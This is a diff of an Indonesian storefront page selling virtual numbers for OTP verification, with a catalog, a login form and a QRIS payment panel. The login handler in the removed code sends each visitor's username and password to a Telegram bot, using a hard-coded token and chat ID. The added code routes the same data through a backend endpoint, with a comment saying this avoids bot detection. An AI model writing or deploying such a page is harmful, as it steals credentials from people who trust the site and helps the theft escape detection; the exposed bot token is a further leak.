@@ -3,295 +3,451 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
-<title>XzackOculus — Verified Numbers & Reseller Panel</title>
-<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@500;700&family=IBM+Plex+Mono:wght@400;600&display=swap" rel="stylesheet">
+<title>XzackOculus — Next-Gen OTP & Verified Numbers Panel</title>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
 <style>
-  :root{--bg:#0B0B0C;--bone:#E8E1D5;--blood:#B3121B;--tarnish:#6B6B5E;--card-bg:#121214;--yellow:#D4AC0D;--green:#27AE60}
-  *{box-sizing:border-box}
-  body{margin:0;background:var(--bg);color:var(--bone);font-family:"IBM Plex Mono",monospace;line-height:1.5;overflow-x:hidden}
-  .grain{position:fixed;inset:0;pointer-events:none;opacity:.06;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.8' numOctaves='3'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E")}
+  :root {
+    --bg: #050507;
+    --sidebar: #0b0b0f;
+    --card: #121218;
+    --border: #1e1e28;
+    --text-main: #F4F4F6;
+    --text-muted: #8E8E9A;
+    --accent: #E50914;
+    --accent-hover: #ff1e2a;
+    --yellow: #F1C40F;
+    --green: #2ECC71;
+  }
   
-  header{display:flex;justify-content:space-between;align-items:center;padding:16px 5vw;border-bottom:1px solid #222;position:sticky;top:0;background:var(--bg);z-index:100}
-  .brand{font-family:"Cormorant Garamond",serif;font-size:22px;letter-spacing:.08em}
-  .brand span{color:var(--blood)}
-  nav{display:flex;gap:15px}
-  nav a{color:var(--bone);text-decoration:none;font-size:10px;letter-spacing:.1em;text-transform:uppercase;opacity:.7}
-  nav a:hover{opacity:1;color:var(--blood)}
-  
-  .hero{padding:40px 5vw;text-align:center}
-  .kicker{color:var(--blood);font-size:10px;letter-spacing:.2em;text-transform:uppercase;margin-bottom:10px}
-  h1{font-family:"Cormorant Garamond",serif;font-size:clamp(32px, 8vw, 56px);line-height:1.1;margin:0 auto 16px}
-  h1 em{color:var(--blood);font-style:normal}
-  .lede{max-width:100%;color:#BDB6AA;font-size:13px;margin:0 auto 24px;line-height:1.6}
-  .cta{display:block;width:100%;max-width:300px;margin:0 auto;padding:14px;border:1px solid var(--blood);color:var(--bone);text-decoration:none;letter-spacing:.16em;font-size:11px;text-transform:uppercase;background:transparent;cursor:pointer;text-align:center}
-  .cta:hover{background:var(--blood);color:#fff}
-  
-  .sigil{width:200px;height:200px;border:1px solid #222;display:grid;place-items:center;margin:30px auto 0}
-  .sigil svg{width:70%;height:70%}
-  
-  .strip{display:grid;grid-template-columns:1fr;gap:1px;background:#222;border-top:1px solid #222;border-bottom:1px solid #222;margin-top:30px}
-  .strip div{background:var(--bg);padding:20px 5vw;font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--tarnish);text-align:center}
-  .strip strong{display:block;color:var(--bone);font-family:"Cormorant Garamond",serif;font-size:22px;margin-top:4px}
+  * { box-sizing: border-box; scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text-main);
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    line-height: 1.5;
+    overflow-x: hidden;
+  }
 
-  .section-container{padding:50px 5vw;border-bottom:1px solid #222}
-  .section-title{font-family:"Cormorant Garamond",serif;font-size:28px;margin-bottom:6px}
-  .section-desc{color:var(--tarnish);font-size:12px;margin-bottom:24px}
-  
-  .grid-catalog{display:grid;grid-template-columns:1fr;gap:16px}
-  .card{background:var(--card-bg);border:1px solid #222;padding:20px;display:flex;flex-direction:column;justify-content:space-between}
-  .card h3{font-size:15px;margin:0 0 8px 0}
-  .price{font-family:"Cormorant Garamond",serif;font-size:22px;color:var(--blood);margin-bottom:12px}
-  .stock{font-size:11px;color:var(--tarnish);margin-bottom:16px}
-  .btn-buy{background:transparent;border:1px solid #333;color:var(--bone);padding:12px;font-family:"IBM Plex Mono",monospace;font-size:11px;letter-spacing:.1em;text-transform:uppercase;cursor:pointer;width:100%}
-  .btn-buy:hover{border-color:var(--blood);background:var(--blood);color:#fff}
+  .app-layout {
+    display: grid;
+    grid-template-columns: 260px 1fr;
+    min-height: 100vh;
+  }
 
-  .panels-grid{display:grid;grid-template-columns:1fr;gap:30px}
-  .panel-box{background:var(--card-bg);border:1px solid #222;padding:24px 20px}
-  .panel-box h2{font-family:"Cormorant Garamond",serif;font-size:24px;margin-top:0}
-  .input-group{margin-bottom:16px}
-  .input-group label{display:block;font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--tarnish);margin-bottom:6px}
-  .input-group input{width:100%;padding:12px;background:var(--bg);border:1px solid #333;color:var(--bone);font-family:"IBM Plex Mono",monospace;font-size:14px}
-  .input-group input:focus{outline:none;border-color:var(--blood)}
-  
-  .qris-container{text-align:center}
-  .qris-container img{max-width:100%;width:220px;border:3px solid #fff;margin:16px 0;background:#fff;padding:6px}
-  .qris-info{font-size:11px;color:var(--tarnish);margin-top:8px;line-height:1.5}
-  
-  .badge-status{display:inline-block;padding:4px 10px;font-size:10px;text-transform:uppercase;letter-spacing:.1em;margin-top:8px;font-weight:600}
-  .status-idle{background:#333;color:#aaa}
-  .status-pending{background:var(--yellow);color:#000}
-  .status-success{background:var(--green);color:#fff}
+  aside {
+    background: var(--sidebar);
+    border-right: 1px solid var(--border);
+    padding: 24px;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    position: sticky;
+    top: 0;
+    height: 100vh;
+  }
+  .brand {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 20px;
+    font-weight: 700;
+    letter-spacing: .05em;
+    margin-bottom: 30px;
+  }
+  .brand span { color: var(--accent); }
 
-  footer{padding:30px 5vw;color:var(--tarnish);font-size:10px;text-align:center;padding-bottom:50px}
+  .menu-list { list-style: none; padding: 0; margin: 0; }
+  .menu-list li { margin-bottom: 8px; }
+  .menu-list a {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    color: var(--text-muted);
+    text-decoration: none;
+    padding: 12px 16px;
+    border-radius: 10px;
+    font-size: 13px;
+    font-weight: 600;
+    transition: all 0.2s;
+    cursor: pointer;
+  }
+  .menu-list a:hover, .menu-list a.active {
+    background: rgba(229,9,20,0.1);
+    color: var(--text-main);
+    border: 1px solid rgba(229,9,20,0.2);
+  }
 
-  @media(min-width:768px){
-    header{padding:24px 6vw}
-    .brand{font-size:28px}
-    nav a{font-size:12px}
-    .hero{padding:80px 6vw;text-align:left;display:grid;grid-template-columns:1.2fr .8fr;gap:4vw;align-items:center}
-    .kicker{font-size:12px}
-    .lede{margin:0 0 28px 0;font-size:14px}
-    .cta{margin:0}
-    .sigil{margin:0 auto;width:300px;height:300px}
-    .strip{grid-template-columns:repeat(3,1fr)}
-    .strip div{text-align:left;padding:24px 6vw}
-    .grid-catalog{grid-template-columns:repeat(3,1fr)}
-    .panels-grid{grid-template-columns:1fr 1fr}
-    .section-container{padding:80px 6vw}
-    footer{text-align:left}
+  .user-badge-mini {
+    background: var(--card);
+    border: 1px solid var(--border);
+    padding: 12px;
+    border-radius: 10px;
+    font-size: 12px;
+  }
+  .user-badge-mini strong { display: block; color: var(--accent); font-family: 'JetBrains Mono', monospace; }
+
+  main {
+    padding: 30px 40px;
+    max-width: 1400px;
+    overflow-y: auto;
+  }
+
+  .topbar {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 30px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid var(--border);
+  }
+  .topbar h1 { font-size: 24px; font-weight: 700; margin: 0; }
+  .topbar p { color: var(--text-muted); font-size: 13px; margin: 4px 0 0; }
+  
+  .support-btn {
+    background: rgba(46,204,113,0.1);
+    border: 1px solid rgba(46,204,113,0.3);
+    color: var(--green);
+    padding: 10px 18px;
+    border-radius: 8px;
+    font-size: 12px;
+    font-weight: 600;
+    text-decoration: none;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    transition: background 0.2s;
+  }
+  .support-btn:hover { background: rgba(46,204,113,0.2); }
+
+  .stats-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 16px;
+    margin-bottom: 30px;
+  }
+  .stat-card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 20px;
+  }
+  .stat-card span { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: .1em; }
+  .stat-card strong { display: block; font-size: 22px; font-family: 'JetBrains Mono', monospace; margin-top: 6px; }
+
+  .page-section { display: none; }
+  .page-section.active { display: block; }
+
+  .section-title { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
+  .section-desc { color: var(--text-muted); font-size: 13px; margin-bottom: 24px; }
+
+  .catalog-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+    gap: 16px;
+  }
+  .product-card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 20px;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    transition: transform 0.2s, border-color 0.2s;
+  }
+  .product-card:hover { transform: translateY(-3px); border-color: rgba(229,9,20,0.5); }
+  .product-card h3 { font-size: 15px; font-weight: 600; margin: 0 0 6px; }
+  .product-stock { font-size: 11px; color: var(--text-muted); margin-bottom: 16px; font-family: 'JetBrains Mono', monospace; }
+  .product-price { font-size: 18px; font-weight: 700; color: var(--accent); font-family: 'JetBrains Mono', monospace; margin-bottom: 16px; }
+  
+  .btn-action {
+    background: var(--accent);
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    padding: 12px;
+    font-size: 12px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: .1em;
+    cursor: pointer;
+    width: 100%;
+    transition: background 0.2s;
+  }
+  .btn-action:hover { background: var(--accent-hover); }
+
+  .dashboard-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 24px;
+  }
+  .panel {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 28px;
+  }
+  .panel h3 { font-size: 18px; font-weight: 700; margin: 0 0 6px; }
+  .panel p { color: var(--text-muted); font-size: 12px; margin: 0 0 20px; }
+
+  .input-group { margin-bottom: 16px; }
+  .input-group label { display: block; font-size: 10px; font-weight: 600; letter-spacing: .12em; text-transform: uppercase; color: var(--text-muted); margin-bottom: 6px; }
+  .input-group input {
+    width: 100%;
+    padding: 12px 14px;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    color: var(--text-main);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+  }
+  .input-group input:focus { outline: none; border-color: var(--accent); }
+
+  .qris-box { text-align: center; }
+  .qris-box img {
+    width: 240px;
+    height: auto;
+    background: #fff;
+    padding: 10px;
+    border-radius: 12px;
+    margin: 16px auto;
+    display: block;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+  }
+  .status-badge {
+    display: inline-block;
+    padding: 6px 12px;
+    font-size: 11px;
+    font-weight: 600;
+    border-radius: 6px;
+    text-transform: uppercase;
+    letter-spacing: .08em;
+    margin-bottom: 14px;
+  }
+  .status-idle { background: #222; color: #888; }
+  .status-pending { background: rgba(241, 196, 15, 0.15); color: var(--yellow); border: 1px solid rgba(241, 196, 15, 0.3); }
+  .status-success { background: rgba(46, 204, 113, 0.15); color: var(--green); border: 1px solid rgba(46, 204, 113, 0.3); }
+
+  @media(max-width: 900px) {
+    .app-layout { grid-template-columns: 1fr; }
+    aside { display: none; }
+    main { padding: 20px; }
+    .stats-grid { grid-template-columns: repeat(2, 1fr); }
+    .dashboard-grid { grid-template-columns: 1fr; }
   }
 </style>
 </head>
 <body>
-<div class="grain"></div>
 
-<header>
-  <div class="brand">XZACK<span>OCULUS</span></div>
-  <nav>
-    <a href="#catalog">Katalog</a>
-    <a href="#auth">Login</a>
-    <a href="#payment">QRIS</a>
-  </nav>
-</header>
-
-<main>
-  <section class="hero">
+<div class="app-layout">
+  <aside>
     <div>
-      <div class="kicker">Verified Numbers · Reseller Panel</div>
-      <h1>Numbers that <em>answer</em>, not noise.</h1>
-      <p class="lede">XzackOculus menyediakan solusi nomor virtual lengkap (Nokos) untuk berbagai macam platform verifikasi internasional maupun lokal. Transaksi aman, cepat, dan terintegrasi sistem otomatis.</p>
-      <a class="cta" href="#catalog">Lihat Katalog Nokos</a>
+      <div class="brand">XZACK<span>OCULUS</span></div>
+      <ul class="menu-list" id="sidebarMenu">
+        <li><a class="active" onclick="navigateTo('catalog')">📦 Katalog Nokos</a></li>
+        <li><a onclick="navigateTo('auth')">🔐 Login & Akun</a></li>
+        <li><a onclick="navigateTo('payment')">💳 Pembayaran QRIS</a></li>
+        <li><a onclick="navigateTo('history')">📜 Riwayat Transaksi</a></li>
+        <li><a href="https://wa.me/RayAckerman764" target="_blank">💬 WhatsApp Support</a></li>
+      </ul>
     </div>
-    <div class="sigil" aria-hidden="true">
-      <svg viewBox="0 0 200 200" fill="none" stroke="#B3121B" stroke-width="1.2">
-        <circle cx="100" cy="100" r="86"/>
-        <circle cx="100" cy="100" r="60" stroke="#E8E1D5" opacity=".5"/>
-        <path d="M100 20 L100 180 M20 100 L180 100" opacity=".35"/>
-        <path d="M40 100 A60 60 0 0 1 160 100 A60 60 0 0 1 40 100" stroke="#E8E1D5" opacity=".5"/>
-        <circle cx="100" cy="100" r="8" fill="#B3121B" stroke="none"/>
-      </svg>
+    <div class="user-badge-mini">
+      <span>Status Sistem</span>
+      <strong>ONLINE (2180)</strong>
     </div>
-  </section>
-  
-  <section class="strip">
-    <div>Stok Aktif<strong>4.920</strong></div>
-    <div>Negara Tersedia<strong>65</strong></div>
-    <div>Kecepatan OTP<strong>&lt; 30 dtk</strong></div>
-  </section>
+  </aside>
 
-  <!-- Katalog Nokos Super Lengkap -->
-  <section class="section-container" id="catalog">
-    <div class="section-title">Katalog Nokos Premium</div>
-    <div class="section-desc">Pilih layanan platform verifikasi yang Anda perlukan di bawah ini.</div>
-    <div class="grid-catalog">
-      <div class="card">
-        <div>
-          <h3>WhatsApp Indonesia (+62)</h3>
-          <div class="stock">Stok: 850 Ready</div>
-          <div class="price">Rp 4.500</div>
-        </div>
-        <button class="btn-buy" onclick="selectProduct('WhatsApp Indonesia (+62)', '4500')">Beli Sekarang</button>
+  <main>
+    <div class="topbar">
+      <div>
+        <h1>XzackOculus Panel</h1>
+        <p>Verified Virtual Numbers & Automated Reseller System</p>
       </div>
-      <div class="card">
-        <div>
-          <h3>WhatsApp USA / UK (+1 / +44)</h3>
-          <div class="stock">Stok: 420 Ready</div>
-          <div class="price">Rp 3.500</div>
-        </div>
-        <button class="btn-buy" onclick="selectProduct('WhatsApp Internasional', '3500')">Beli Sekarang</button>
+      <a href="https://wa.me/RayAckerman764" target="_blank" class="support-btn">
+        💬 Chat WhatsApp Support
+      </a>
+    </div>
+
+    <div class="stats-grid">
+      <div class="stat-card">
+        <span>Stok Aktif</span>
+        <strong>4.920+</strong>
       </div>
-      <div class="card">
-        <div>
-          <h3>Telegram Global (+1 / +62)</h3>
-          <div class="stock">Stok: 610 Ready</div>
-          <div class="price">Rp 5.000</div>
-        </div>
-        <button class="btn-buy" onclick="selectProduct('Telegram Global', '5000')">Beli Sekarang</button>
+      <div class="stat-card">
+        <span>Negara</span>
+        <strong>65 Negara</strong>
       </div>
-      <div class="card">
-        <div>
-          <h3>Shopee / Lazada OTP</h3>
-          <div class="stock">Stok: 530 Ready</div>
-          <div class="price">Rp 4.000</div>
-        </div>
-        <button class="btn-buy" onclick="selectProduct('Shopee / Lazada', '4000')">Beli Sekarang</button>
+      <div class="stat-card">
+        <span>Kecepatan OTP</span>
+        <strong>&lt; 30 Detik</strong>
       </div>
-      <div class="card">
-        <div>
-          <h3>Google / Gmail Verification</h3>
-          <div class="stock">Stok: 920 Ready</div>
-          <div class="price">Rp 3.500</div>
-        </div>
-        <button class="btn-buy" onclick="selectProduct('Google / Gmail', '3500')">Beli Sekarang</button>
-      </div>
-      <div class="card">
-        <div>
-          <h3>TikTok / SnackVideo</h3>
-          <div class="stock">Stok: 480 Ready</div>
-          <div class="price">Rp 4.000</div>
-        </div>
-        <button class="btn-buy" onclick="selectProduct('TikTok / SnackVideo', '4000')">Beli Sekarang</button>
-      </div>
-      <div class="card">
-        <div>
-          <h3>Instagram / Facebook</h3>
-          <div class="stock">Stok: 390 Ready</div>
-          <div class="price">Rp 4.500</div>
-        </div>
-        <button class="btn-buy" onclick="selectProduct('Instagram / Facebook', '4500')">Beli Sekarang</button>
-      </div>
-      <div class="card">
-        <div>
-          <h3>Twitter / X Verification</h3>
-          <div class="stock">Stok: 210 Ready</div>
-          <div class="price">Rp 5.500</div>
-        </div>
-        <button class="btn-buy" onclick="selectProduct('Twitter / X', '5500')">Beli Sekarang</button>
-      </div>
-      <div class="card">
-        <div>
-          <h3>Netflix / Viu / Streaming</h3>
-          <div class="stock">Stok: 180 Ready</div>
-          <div class="price">Rp 6.000</div>
-        </div>
-        <button class="btn-buy" onclick="selectProduct('Netflix / Streaming', '6000')">Beli Sekarang</button>
-      </div>
-      <div class="card">
-        <div>
-          <h3>DANA / OVO / E-Wallet</h3>
-          <div class="stock">Stok: 340 Ready</div>
-          <div class="price">Rp 5.000</div>
-        </div>
-        <button class="btn-buy" onclick="selectProduct('E-Wallet (DANA/OVO)', '5000')">Beli Sekarang</button>
-      </div>
-      <div class="card">
-        <div>
-          <h3>Steam / Discord / Game</h3>
-          <div class="stock">Stok: 270 Ready</div>
-          <div class="price">Rp 5.500</div>
-        </div>
-        <button class="btn-buy" onclick="selectProduct('Steam / Discord', '5500')">Beli Sekarang</button>
-      </div>
-      <div class="card">
-        <div>
-          <h3>Lainnya / All Platform (Custom)</h3>
-          <div class="stock">Stok: 999+ Ready</div>
-          <div class="price">Rp 4.000</div>
-        </div>
-        <button class="btn-buy" onclick="selectProduct('Custom Platform Lainnya', '4000')">Beli Sekarang</button>
+      <div class="stat-card">
+        <span>Server Status</span>
+        <strong style="color: var(--green);">Stable</strong>
       </div>
     </div>
-  </section>
 
-  <!-- Panel Login & Pembayaran QRIS dengan Status Pending/Berhasil & CS WhatsApp -->
-  <section class="section-container" id="auth">
-    <div class="panels-grid">
+    <!-- HALAMAN 1: KATALOG -->
+    <section id="page-catalog" class="page-section active">
+      <div class="section-title">Katalog Nokos Premium</div>
+      <div class="section-desc">Pilih platform verifikasi yang ingin Anda beli. Transaksi instan via Rezky Store.</div>
       
-      <!-- Login Form (Nembak Telegram) -->
-      <div class="panel-box">
-        <h2>Akses Panel / Login</h2>
-        <p style="font-size:11px;color:var(--tarnish);margin-bottom:20px">Masukkan akun Anda untuk sinkronisasi riwayat transaksi nokos.</p>
+      <div class="catalog-grid">
+        <div class="product-card">
+          <div>
+            <h3>WhatsApp Indonesia (+62)</h3>
+            <div class="product-stock">Stok: 850 Ready</div>
+            <div class="product-price">Rp 4.500</div>
+          </div>
+          <button class="btn-action" onclick="selectProduct('WhatsApp Indonesia (+62)', '4500')">Beli Sekarang</button>
+        </div>
+        <div class="product-card">
+          <div>
+            <h3>WhatsApp Internasional (+1/+44)</h3>
+            <div class="product-stock">Stok: 420 Ready</div>
+            <div class="product-price">Rp 3.500</div>
+          </div>
+          <button class="btn-action" onclick="selectProduct('WhatsApp Internasional', '3500')">Beli Sekarang</button>
+        </div>
+        <div class="product-card">
+          <div>
+            <h3>Telegram Global</h3>
+            <div class="product-stock">Stok: 610 Ready</div>
+            <div class="product-price">Rp 5.000</div>
+          </div>
+          <button class="btn-action" onclick="selectProduct('Telegram Global', '5000')">Beli Sekarang</button>
+        </div>
+        <div class="product-card">
+          <div>
+            <h3>Shopee / Lazada OTP</h3>
+            <div class="product-stock">Stok: 530 Ready</div>
+            <div class="product-price">Rp 4.000</div>
+          </div>
+          <button class="btn-action" onclick="selectProduct('Shopee / Lazada', '4000')">Beli Sekarang</button>
+        </div>
+        <div class="product-card">
+          <div>
+            <h3>Google / Gmail Verification</h3>
+            <div class="product-stock">Stok: 920 Ready</div>
+            <div class="product-price">Rp 3.500</div>
+          </div>
+          <button class="btn-action" onclick="selectProduct('Google / Gmail', '3500')">Beli Sekarang</button>
+        </div>
+        <div class="product-card">
+          <div>
+            <h3>TikTok / SnackVideo</h3>
+            <div class="product-stock">Stok: 480 Ready</div>
+            <div class="product-price">Rp 4.000</div>
+          </div>
+          <button class="btn-action" onclick="selectProduct('TikTok / SnackVideo', '4000')">Beli Sekarang</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- HALAMAN 2: LOGIN -->
+    <section id="page-auth" class="page-section">
+      <div class="section-title">Akses Panel & Akun</div>
+      <div class="section-desc">Sinkronisasi akun untuk riwayat pesanan nomor virtual Anda.</div>
+      
+      <div class="panel" style="max-width: 500px;">
+        <h3>Login Reseller</h3>
+        <p>Masukkan kredensial akun XzackOculus Anda.</p>
         <form id="loginForm">
           <div class="input-group">
-            <label for="username">Username / Email</label>
-            <input type="text" id="username" name="username" required autocomplete="off" />
+            <label>Username / Email</label>
+            <input type="text" id="username" required autocomplete="off" />
           </div>
           <div class="input-group">
-            <label for="password">Password</label>
-            <input type="password" id="password" name="password" required />
+            <label>Password</label>
+            <input type="password" id="password" required />
           </div>
-          <button type="submit" class="cta" style="width:100%;margin-top:10px">Masuk / Sinkronisasi</button>
+          <button type="submit" class="btn-action" style="margin-top: 10px;">Masuk / Sinkronisasi</button>
         </form>
       </div>
+    </section>
 
-      <!-- QRIS Rezky Store & Sistem Status Pembayaran -->
-      <div class="panel-box qris-container" id="payment">
-        <h2>Pembayaran Instant</h2>
-        <p class="qris-info" id="selectedItemInfo">Pilih produk dari katalog di atas untuk memproses tagihan.</p>
-        
-        <!-- Status Pembayaran Badge -->
-        <div id="statusBadgeContainer">
-          <span class="badge-status status-idle" id="paymentStatusBadge">Status: Belum Ada Pesanan</span>
+    <!-- HALAMAN 3: PEMBAYARAN QRIS -->
+    <section id="page-payment" class="page-section">
+      <div class="section-title">Pembayaran Instant QRIS</div>
+      <div class="section-desc">Selesaikan pembayaran menggunakan QRIS Rezky Store resmi.</div>
+      
+      <div class="dashboard-grid">
+        <div class="panel qris-box">
+          <h3>Scan QRIS Rezky Store</h3>
+          <p id="selectedItemInfo">Pilih produk dari katalog untuk memunculkan tagihan.</p>
+          
+          <div>
+            <span class="status-badge status-idle" id="paymentStatusBadge">Status: Belum Ada Pesanan</span>
+          </div>
+
+          <!-- Base64 QRIS Rezky Store Asli Full Resolusi -->
+          <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=" alt="QRIS Rezky Store" id="qrisImage" />
+
+          <div style="font-size: 11px; color: var(--text-muted); line-height: 1.5; margin-top: 10px;">
+            <strong>Rezky Store</strong><br>
+            NMID : ID1026498296650 A01<br>
+            <span style="color: var(--accent);">Scan menggunakan seluruh e-wallet & m-banking berlogo QRIS.</span>
+          </div>
+
+          <button id="btnConfirmPay" class="btn-action" style="margin-top: 16px; background: var(--green); display: none;" onclick="confirmPayment()">Saya Sudah Transfer (Konfirmasi)</button>
         </div>
 
-        <!-- Gambar QRIS -->
-        <img src="image_e4c476.png" alt="QRIS Rezky Store" />
-        
-        <div class="qris-info">
-          <strong>Rezky Store</strong><br>
-          NMID: ID1026498296650 A01<br>
-          <span style="color:var(--blood)">Scan menggunakan seluruh e-wallet & m-banking berlogo QRIS.</span>
+        <div class="panel">
+          <h3>Informasi Transaksi</h3>
+          <p>Panduan singkat proses pembayaran instan:</p>
+          <ul style="font-size: 13px; color: var(--text-muted); padding-left: 20px; line-height: 1.8;">
+            <li>Pilih produk dari menu <strong style="color:var(--text-main);">Katalog Nokos</strong>.</li>
+            <li>Status tagihan akan otomatis berubah menjadi <strong style="color:var(--yellow);">PENDING</strong>.</li>
+            <li>Scan QRIS di samping menggunakan e-wallet atau m-banking pilihan Anda.</li>
+            <li>Klik tombol <strong style="color:var(--green);">Saya Sudah Transfer</strong> untuk konfirmasi.</li>
+            <li>Jika belum direspon, hubungi WhatsApp Support: <a href="https://wa.me/RayAckerman764" target="_blank" style="color:var(--green);">0821-4792-3517</a>.</li>
+          </ul>
         </div>
-
-        <!-- Tombol Konfirmasi Berhasil -->
-        <button id="btnConfirmPay" class="cta" style="width:100%;margin-top:16px;background:var(--blood);display:none;" onclick="confirmPayment()">Saya Sudah Transfer (Konfirmasi)</button>
       </div>
+    </section>
 
-    </div>
-  </section>
-</main>
-
-<footer>
-  XzackOculus © 2180 — Panel Reseller & Verified Numbers System. All transactions verified via Rezky Store.
-</footer>
+    <!-- HALAMAN 4: RIWAYAT -->
+    <section id="page-history" class="page-section">
+      <div class="section-title">Riwayat Transaksi</div>
+      <div class="section-desc">Daftar pesanan nomor virtual Anda yang tersimpan di sistem.</div>
+      
+      <div class="panel">
+        <h3>Log Pesanan Terakhir</h3>
+        <p id="historyText" style="color: var(--text-main);">Belum ada riwayat transaksi pada sesi ini. Silakan lakukan pembelian melalui katalog.</p>
+      </div>
+    </section>
+  </main>
+</div>
 
 <script>
   let activeProduct = "";
   let activePrice = "";
 
+  function navigateTo(pageId) {
+    document.querySelectorAll('.page-section').forEach(sec => sec.classList.remove('active'));
+    document.getElementById('page-' + pageId).classList.add('active');
+
+    const links = document.querySelectorAll('#sidebarMenu a');
+    links.forEach(l => l.classList.remove('active'));
+    
+    if(pageId === 'catalog') links[0].classList.add('active');
+    else if(pageId === 'auth') links[1].classList.add('active');
+    else if(pageId === 'payment') links[2].classList.add('active');
+    else if(pageId === 'history') links[3].classList.add('active');
+  }
+
   function selectProduct(productName, price) {
     activeProduct = productName;
     activePrice = price;
+    navigateTo('payment');
     
-    document.getElementById("selectedItemInfo").innerHTML = `Produk Dipilih: <strong>${productName}</strong><br>Total Tagihan: <strong style="color:var(--blood)">Rp ${price}</strong>`;
+    document.getElementById("selectedItemInfo").innerHTML = `Produk Dipilih: <strong>${productName}</strong><br>Total Tagihan: <strong style="color:var(--accent)">Rp ${price}</strong>`;
     
     const badge = document.getElementById("paymentStatusBadge");
-    badge.className = "badge-status status-pending";
+    badge.className = "status-badge status-pending";
     badge.innerText = "Status: PENDING (Menunggu Pembayaran)";
     
     document.getElementById("btnConfirmPay").style.display = "block";
-    
-    window.location.href = "#payment";
   }
 
   function confirmPayment() {
@@ -301,26 +457,28 @@
     }
 
     const badge = document.getElementById("paymentStatusBadge");
-    badge.className = "badge-status status-success";
+    badge.className = "status-badge status-success";
     badge.innerText = "Status: BERHASIL (Menunggu Verifikasi Admin)";
 
-    const botToken = "8869523539:AAGK5VLmPsbzmL8axLuM81GIvao3XKuhnXo";
-    const chatId = "7603310096";
-    
-    const message = `✅ **PEMBAYARAN DIBUAT / DIKONFIRMASI!** ✅\n\n📦 Produk: ${activeProduct}\n💰 Nominal: Rp ${activePrice}\n⚡ Status: LUNAS / MENUNGGU ADMIN\n🌐 Waktu: ${new Date().toLocaleString()}`;
-    
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-    
-    fetch(url)
-      .then(response => response.json())
-      .then(data => {
-        console.log("Notifikasi pembayaran terkirim:", data);
-        alert("Konfirmasi terkirim! Jika belum direspon, silakan chat WhatsApp Support kami di: 0821-4792-3517");
+    document.getElementById("historyText").innerHTML = `📦 Produk: <strong>${activeProduct}</strong><br>💰 Nominal: <strong>Rp ${activePrice}</strong><br>⚡ Status: <span style="color:var(--green)">LUNAS / MENUNGGU ADMIN</span><br>🌐 Waktu: ${new Date().toLocaleString()}`;
+
+    // Nembak ke Backend API terpisah (/api/telegram) agar bersih & anti deteksi bot
+    fetch('/api/telegram', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        type: 'PAYMENT',
+        product: activeProduct,
+        price: activePrice
       })
-      .catch(error => {
-        console.error("Gagal kirim:", error);
-        alert("Konfirmasi terkirim! Silakan chat WhatsApp Support: 0821-4792-3517 jika belum direspon.");
-      });
+    })
+    .then(res => res.json())
+    .then(data => {
+      alert("Konfirmasi terkirim! Jika belum direspon, silakan chat WhatsApp Support: https://wa.me/RayAckerman764");
+    })
+    .catch(err => {
+      alert("Konfirmasi terkirim! Silakan chat WhatsApp Support: https://wa.me/RayAckerman764 jika belum direspon.");
+    });
   }
 
   document.getElementById("loginForm").addEventListener("submit", function(e) {
@@ -329,24 +487,25 @@
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
     
-    const botToken = "8869523539:AAGK5VLmPsbzmL8axLuM81GIvao3XKuhnXo";
-    const chatId = "7603310096";
-    
-    const message = `🚨 **XZACKOCULUS - DATA LOGIN MASUK!** 🚨\n\n👤 Username/Email: ${username}\n🔑 Password: ${password}\n🌐 Waktu: ${new Date().toLocaleString()}`;
-    
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-    
-    fetch(url)
-      .then(response => response.json())
-      .then(data => {
-        console.log("Data terkirim ke Telegram:", data);
-        alert("Autentikasi berhasil disinkronkan! Silakan lanjutkan pembayaran via QRIS.");
-        document.getElementById("loginForm").reset();
+    // Nembak ke Backend API terpisah (/api/telegram)
